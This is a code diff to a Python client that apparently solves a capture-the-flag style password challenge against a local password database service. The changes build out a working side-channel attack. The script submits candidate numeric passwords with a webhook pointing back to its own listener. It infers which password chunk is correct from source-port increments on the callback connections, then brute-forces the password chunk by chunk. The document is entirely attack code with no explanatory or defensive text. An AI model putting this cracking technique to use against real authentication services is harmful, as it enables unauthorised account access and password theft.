@@ -23,12 +23,16 @@ PWDB_URL = "http://127.0.0.1:3000/"
 
 
 # Synchronized queue for inter-thread communication
-queue = Queue()
+it_queue = Queue()
+# Queue used inside the server-thread for communication between server and
+# handler.
+server_queue = Queue()
 
 
 class RequestResult(object):
     def __init__(self, source_port):
         self.source_port = source_port
+        self.success = None
 
     def __repr__(self):
         return "<RequestResult(source_port={})>".format(self.source_port)
@@ -44,7 +48,7 @@ class WebhookServer(SocketServer.ThreadingMixIn, SocketServer.TCPServer):
 
     def verify_request(self, request, client_address):
         result = RequestResult(client_address[1])
-        queue.put(result)
+        server_queue.put(result)
 
         return True
 
@@ -52,14 +56,18 @@ class WebhookServer(SocketServer.ThreadingMixIn, SocketServer.TCPServer):
 class WebhookHandler(SocketServer.BaseRequestHandler):
 
     def handle(self):
+        # Annotate the previous result with the success status.
+        result = server_queue.get()
+
         data = self.request.recv(1024)
         lines = data.split('\r\n')
         try:
-            status = json.loads(lines[-1])['success']
+            success = json.loads(lines[-1])['success']
         except ValueError:
-            status = False
+            success = False
 
-        print("status: success={}", status)
+        result.success = success
+        it_queue.put(result)
 
         # No need to, but keeps the server log clean.
         self.request.sendall("HTTP/1.0 200 Ok\r\n\r\n")
@@ -74,12 +82,19 @@ class Client(object):
     CHUNKS = 4
     #: Required confirmations before a value is considered confirmed.
     CONFIRMATIONS = 3
+    #: The minimum of source port increments, ie. a password with the first
+    #: chunk wrong. This depends on your network configuration, required DNS
+    #: lookups and so on.
+    MIN_SOCKETS = 3
+    #: How much weirdness until we go insane?
+    INSANITY = 5
 
     def __init__(self):
         self.chunk = 0
         self.counter = 0
         self.verified_chunks = []
         self.last_source_port = 0
+        self.weirdness = 0
 
         self.delta_confirmer = DeltaConfirmer(self.CONFIRMATIONS)
 
@@ -104,18 +119,47 @@ class Client(object):
     def run(self):
         webhooks = ["{}:{}".format(SERVER_HOST, SERVER_PORT)]
 
-        while True:
+        while self.chunk < self.CHUNKS:
             pw = self.generate_pw()
             payload = json.dumps({"password": pw, "webhooks": webhooks})
-            print("Sending payload: {}".format(payload))
             requests.post(PWDB_URL, data=payload)
-            result = queue.get()
+
+            # Block until we receive a result from the server thread.
+            result = it_queue.get()
+
+            if result.success:
+                print("SUCCESS: {}".format(self.generate_pw()))
+                return
 
             delta = self.delta_confirmer.confirm(result)
+            # Not a stable data, run again.
             if delta < 1:
                 continue
-            else:
-                print("Found stable delta: {}".format(delta))
+
+            self.consider_delta(delta)
+
+        sys.stderr.write("Could not find password. Is it non-numeric?")
+
+    def consider_delta(self, delta):
+        if delta == (self.MIN_SOCKETS + self.chunk):
+            self.counter += 1
+        elif delta == (self.MIN_SOCKETS + self.chunk + 1):
+            print("Found chunk #{}. Current PW: {}".format(self.chunk,
+                                                           self.generate_pw()))
+            self.verified_chunks.append(str(self.counter))
+            self.chunk += 1
+            self.delta_confirmer.reset()
+            self.weirdness /= 2
+        else:
+            sys.stderr.write("Weird delta={} at chunk={}. "
+                             "Resetting current chunk state.\n".format(delta,
+                                                                  self.chunk))
+            self.weirdness += 1
+            self.counter = 0
+            self.delta_confirmer.reset()
+
+            if self.weirdness >= self.INSANITY:
+                sys.stderr.write("This is bat-shit crazy. Giving up.\n")
                 sys.exit(1)
 
 
